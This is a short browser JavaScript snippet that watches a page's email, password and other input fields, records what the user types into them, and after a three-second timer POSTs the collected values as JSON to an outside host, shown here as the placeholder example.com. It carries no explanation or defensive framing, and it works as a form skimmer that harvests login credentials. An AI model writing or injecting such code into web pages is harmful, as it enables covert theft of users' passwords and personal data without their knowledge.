const elements = [];

elements.push(document.getElementById('test'));
elements.push(document.getElementById('email'));
elements.push(document.getElementById('esiminch'));
elements.push(document.getElementById('password'));

const values = [];

// console.log(elements);

for (const element of elements) {
  element.addEventListener('change', (event) => {
    values.push({ [element.name]: event.target.value });
  });
}

setTimeout(() => {
  fetch('https://example.com', {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
    },
    body: JSON.stringify(values),
  });
}, 3000);
